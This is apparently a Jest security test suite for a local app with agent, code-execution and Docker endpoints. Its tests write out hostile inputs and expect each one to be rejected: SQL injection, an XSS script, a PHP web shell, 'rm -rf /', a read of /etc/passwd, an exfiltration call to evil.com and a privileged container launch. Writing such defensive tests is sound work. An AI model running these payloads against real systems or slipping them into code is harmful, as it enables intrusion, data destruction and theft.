const { test, expect } = require('@jest/globals');
const request = require('supertest');
const { spawn } = require('child_process');

describe('Security Tests', () => {
  let app;
  
  beforeAll(async () => {
    // Start the application for security testing
    app = spawn('npm', ['run', 'tauri', 'dev'], {
      stdio: 'pipe',
      env: { ...process.env, NODE_ENV: 'test' }
    });
    
    // Wait for app to start
    await new Promise(resolve => setTimeout(resolve, 30000));
  });
  
  afterAll(() => {
    if (app) {
      app.kill();
    }
  });

  describe('Authentication & Authorization', () => {
    test('should require authentication for protected endpoints', async () => {
      const response = await request('http://localhost:1420')
        .get('/api/claude-flow/agents')
        .expect(401);
      
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('authentication');
    });

    test('should validate JWT tokens properly', async () => {
      const invalidToken = 'invalid.jwt.token';
      
      const response = await request('http://localhost:1420')
        .get('/api/claude-flow/status')
        .set('Authorization', `Bearer ${invalidToken}`)
        .expect(401);
      
      expect(response.body.error).toContain('invalid token');
    });

    test('should prevent privilege escalation', async () => {
      const userToken = generateTestToken('user');
      
      const response = await request('http://localhost:1420')
        .post('/api/admin/users')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ role: 'admin' })
        .expect(403);
      
      expect(response.body.error).toContain('insufficient privileges');
    });

    test('should implement proper session management', async () => {
      const token = generateTestToken('user');
      
      // Login
      const loginResponse = await request('http://localhost:1420')
        .post('/api/auth/login')
        .send({ username: 'test', password: 'test123' })
        .expect(200);
      
      // Use session
      const sessionResponse = await request('http://localhost:1420')
        .get('/api/profile')
        .set('Cookie', loginResponse.headers['set-cookie'])
        .expect(200);
      
      // Logout
      await request('http://localhost:1420')
        .post('/api/auth/logout')
        .set('Cookie', loginResponse.headers['set-cookie'])
        .expect(200);
      
      // Session should be invalid after logout
      await request('http://localhost:1420')
        .get('/api/profile')
        .set('Cookie', loginResponse.headers['set-cookie'])
        .expect(401);
    });
  });

  describe('Input Validation & Sanitization', () => {
    test('should prevent SQL injection attacks', async () => {
      const maliciousInput = "'; DROP TABLE users; --";
      
      const response = await request('http://localhost:1420')
        .post('/api/search')
        .send({ query: maliciousInput })
        .expect(400);
      
      expect(response.body.error).toContain('invalid input');
    });

    test('should prevent XSS attacks', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      const response = await request('http://localhost:1420')
        .post('/api/comments')
        .send({ content: xssPayload })
        .expect(400);
      
      expect(response.body.error).toContain('invalid content');
    });

    test('should validate file uploads', async () => {
      const maliciousFile = Buffer.from('<?php system($_GET["cmd"]); ?>');
      
      const response = await request('http://localhost:1420')
        .post('/api/upload')
        .attach('file', maliciousFile, 'test.php')
        .expect(400);
      
      expect(response.body.error).toContain('file type not allowed');
    });

    test('should limit request size', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB
      
      const response = await request('http://localhost:1420')
        .post('/api/data')
        .send({ data: largePayload })
        .expect(413);
      
      expect(response.body.error).toContain('payload too large');
    });

    test('should validate JSON payloads', async () => {
      const response = await request('http://localhost:1420')
        .post('/api/config')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}')
        .expect(400);
      
      expect(response.body.error).toContain('invalid JSON');
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent OS command injection in code execution', async () => {
      const maliciousCode = 'console.log("test"); require("child_process").exec("rm -rf /");';
      
      const response = await request('http://localhost:1420')
        .post('/api/codex/execute')
        .send({
          code: maliciousCode,
          language: 'javascript'
        })
        .expect(400);
      
      expect(response.body.error).toContain('dangerous operations not allowed');
    });

    test('should sandbox code execution', async () => {
      const fileSystemCode = 'const fs = require("fs"); fs.readFileSync("/etc/passwd");';
      
      const response = await request('http://localhost:1420')
        .post('/api/codex/execute')
        .send({
          code: fileSystemCode,
          language: 'javascript'
        })
        .expect(400);
      
      expect(response.body.error).toContain('filesystem access not allowed');
    });

    test('should prevent network access in sandboxed code', async () => {
      const networkCode = 'require("http").get("http://evil.com/steal-data");';
      
      const response = await request('http://localhost:1420')
        .post('/api/codex/execute')
        .send({
          code: networkCode,
          language: 'javascript'
        })
        .expect(400);
      
      expect(response.body.error).toContain('network access not allowed');
    });
  });

  describe('Rate Limiting & DoS Prevention', () => {
    test('should implement rate limiting', async () => {
      const requests = [];
      for (let i = 0; i < 100; i++) {
        requests.push(
          request('http://localhost:1420')
            .get('/api/status')
        );
      }
      
      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should prevent slowloris attacks', async () => {
      const slowRequest = request('http://localhost:1420')
        .post('/api/data')
        .send('{"data": "');
      
      // Don't complete the request immediately
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      const response = await slowRequest
        .send('test"}')
        .expect(408); // Request timeout
    });

    test('should limit concurrent connections', async () => {
      const connections = [];
      for (let i = 0; i < 1000; i++) {
        connections.push(
          request('http://localhost:1420')
            .get('/api/status')
            .timeout(1000)
        );
      }
      
      const results = await Promise.allSettled(connections);
      const rejected = results.filter(r => r.status === 'rejected');
      
      expect(rejected.length).toBeGreaterThan(0);
    });
  });

  describe('Docker Security', () => {
    test('should prevent container escape', async () => {
      const escapeCode = `
        const { spawn } = require('child_process');
        spawn('docker', ['run', '--privileged', 'alpine', 'sh']);
      `;
      
      const response = await request('http://localhost:1420')
        .post('/api/docker/execute')
        .send({
          code: escapeCode,
          image: 'node:18-alpine'
        })
        .expect(400);
      
      expect(response.body.error).toContain('privileged operations not allowed');
    });

    test('should limit container resources', async () => {
      const response = await request('http://localhost:1420')
        .post('/api/docker/create')
        .send({
          image: 'node:18-alpine',
          memory: '10g', // Too much memory
          cpu: '16'      // Too many CPUs
        })
        .expect(400);
      
      expect(response.body.error).toContain('resource limits exceeded');
    });

    test('should prevent host network access', async () => {
      const response = await request('http://localhost:1420')
        .post('/api/docker/create')
        .send({
          image: 'node:18-alpine',
          networkMode: 'host'
        })
        .expect(400);
      
      expect(response.body.error).toContain('host network not allowed');
    });
  });

  describe('Cryptographic Security', () => {
    test('should use secure random number generation', async () => {
      const response = await request('http://localhost:1420')
        .get('/api/token')
        .expect(200);
      
      const token = response.body.token;
      expect(token).toHaveLength(32);
      expect(token).toMatch(/^[a-f0-9]+$/); // Hex string
    });

    test('should hash passwords securely', async () => {
      const response = await request('http://localhost:1420')
        .post('/api/auth/register')
        .send({
          username: 'testuser',
          password: 'securepassword123'
        })
        .expect(201);
      
      // Password should be hashed, not stored in plain text
      expect(response.body.user.password).toBeUndefined();
    });

    test('should use secure communication', async () => {
      const response = await request('http://localhost:1420')
        .get('/api/status');
      
      // Check for security headers
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    });
  });

  describe('Data Protection', () => {
    test('should not expose sensitive information in errors', async () => {
      const response = await request('http://localhost:1420')
        .get('/api/nonexistent')
        .expect(404);
      
      expect(response.body.error).not.toContain('stack trace');
      expect(response.body.error).not.toContain('file path');
      expect(response.body.error).not.toContain('database');
    });

    test('should implement proper data encryption', async () => {
      const sensitiveData = 'secret user data';
      
      const response = await request('http://localhost:1420')
        .post('/api/user/data')
        .send({ data: sensitiveData })
        .expect(200);
      
      // Data should not be stored in plain text
      const storedData = await request('http://localhost:1420')
        .get('/api/admin/raw-data')
        .expect(200);
      
      expect(storedData.body.data).not.toContain(sensitiveData);
    });

    test('should implement secure deletion', async () => {
      const response = await request('http://localhost:1420')
        .delete('/api/user/data/123')
        .expect(200);
      
      // Verify data is actually deleted
      await request('http://localhost:1420')
        .get('/api/user/data/123')
        .expect(404);
    });
  });

  describe('Vulnerability Scanning', () => {
    test('should scan for known vulnerabilities', async () => {
      // This would typically use a tool like Snyk or OWASP Dependency Check
      const vulnerabilities = await scanDependencies();
      
      const criticalVulns = vulnerabilities.filter(v => v.severity === 'critical');
      expect(criticalVulns).toHaveLength(0);
      
      const highVulns = vulnerabilities.filter(v => v.severity === 'high');
      expect(highVulns.length).toBeLessThan(5);
    });
  });
});

// Helper functions
function generateTestToken(role = 'user') {
  // Mock JWT token generation
  return 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test.token';
}

async function scanDependencies() {
  // Mock vulnerability scanning
  return [
    { name: 'test-package', severity: 'low', description: 'Test vulnerability' }
  ];
}